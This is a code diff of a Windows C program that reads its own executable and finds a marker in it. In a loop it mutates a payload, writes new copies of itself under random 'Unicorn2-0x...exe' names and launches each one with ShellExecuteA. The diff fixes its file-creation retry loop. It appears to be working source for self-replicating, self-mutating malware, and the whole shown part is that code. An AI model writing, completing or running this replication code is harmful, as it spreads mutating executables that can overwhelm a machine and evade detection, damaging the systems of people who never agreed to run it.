@@ -42,6 +42,7 @@ int main(int argc, char** argv)
     myFileBuffer = (UINT8*)VirtualAlloc(0, myEXESize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     fread(myFileBuffer, 1, myEXESize, fp);
     fclose(fp);
+    fp = NULL;
     for (int i = 0; i < myEXESize - 3; i++)
         if (myFileBuffer[i] == 0x23 && myFileBuffer[i + 1] == 0x90 && myFileBuffer[i + 2] == 0x90 && myFileBuffer[i + 3] == 0x90)
         {
@@ -71,11 +72,15 @@ int main(int argc, char** argv)
     for (int i = 0; i < NextNum; i++)
     {
         MuNxtPayload();
-        sprintf(nextEXEName, "Unicor2-0x%X%X.exe", rand(), rand());
-        fp = fopen(nextEXEName, "wb");
+        while (fp == NULL)
+        {
+            sprintf(nextEXEName, "Unicorn2-0x%X%X.exe", rand(), rand());
+            fp = fopen(nextEXEName, "wb");
+        }
         fwrite(myFileBuffer, 1, myStaticLength, fp);
         fwrite(nextPayloadBuf, 1, NextPayloadSize, fp);
         fclose(fp);
+        fp = NULL;
         //CreateProcessA(nextEXEName, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
         ShellExecuteA(NULL, "open", nextEXEName, NULL, NULL, SW_SHOWNORMAL);
         Sleep(GapTime);
